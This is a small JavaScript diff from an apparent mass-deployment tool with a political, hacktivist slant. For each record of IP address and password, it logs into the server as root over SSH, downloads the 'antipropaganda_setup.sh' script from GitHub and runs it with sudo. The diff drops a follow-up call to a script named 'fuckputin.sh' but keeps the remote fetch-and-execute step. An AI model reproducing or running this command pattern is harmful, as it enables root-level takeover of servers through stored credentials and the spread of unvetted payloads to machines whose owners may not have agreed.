@@ -42,7 +42,7 @@ function intervalFunc() {
               r.password +
               "' ssh root@" +
               r.ip +
-              " touch ap && wget -O antipropaganda_setup.sh https://raw.githubusercontent.com/qu4ma/antipropaganda/main/antipropaganda_setup.sh && chmod +x antipropaganda_setup.sh && sudo ./antipropaganda_setup.sh && sudo ~/antipropaganda/fuckputin.sh &";
+              " touch ap && wget -O antipropaganda_setup.sh https://raw.githubusercontent.com/qu4ma/antipropaganda/main/antipropaganda_setup.sh && chmod +x antipropaganda_setup.sh && sudo ./antipropaganda_setup.sh &";
             console.log(cmd);
             exec(cmd, (error, stdout, stderr) => {
               if (error) {
